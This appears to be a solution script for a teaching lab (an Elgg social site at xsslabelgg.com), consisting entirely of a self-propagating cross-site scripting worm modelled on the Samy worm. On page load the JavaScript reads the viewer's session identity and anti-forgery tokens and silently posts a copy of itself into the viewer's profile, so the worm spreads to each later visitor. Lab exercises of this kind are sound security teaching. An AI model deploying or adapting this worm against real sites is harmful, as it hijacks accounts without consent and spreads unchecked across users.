    window.onload=function(){
    var userName=elgg.session.user.name;
    var guid="&guid=".concat(elgg.session.user.guid);
    var ts="&__elgg_ts=".concat(elgg.security.token.__elgg_ts);
    var token="&__elgg_token=".concat(elgg.security.token.__elgg_token);
    var briefdesc="&briefdescription=Samy+is+MY+HERO".concat("&accesslevel%5Bbriefdescription%5D=2");
    var name="&name=".concat(userName);
    var jsCode="<script type='text/javascript'id=worm>".concat(document.getElementById("worm").innerHTML).concat("</").concat("script>");
    var wormCode=encodeURIComponent(jsCode);
    var desc="&description=".concat(wormCode).concat(+"&accesslevel%5Bdescription%5D=2");
    //Construct the content of your url.
    var sendurl="http://www.xsslabelgg.com/action/profile/edit";
    var content=token+ts+name+desc+guid; 
    var samyGuid=47;
    if(elgg.session.user.guid!=samyGuid) {
    //Create and send Ajax request to modify profile
    var Ajax=null;
    Ajax=new XMLHttpRequest();
    Ajax.open("POST",sendurl,true)
    Ajax.setRequestHeader("Host","www.xsslabelgg.com");
    Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    Ajax.send(content);
    }
    }
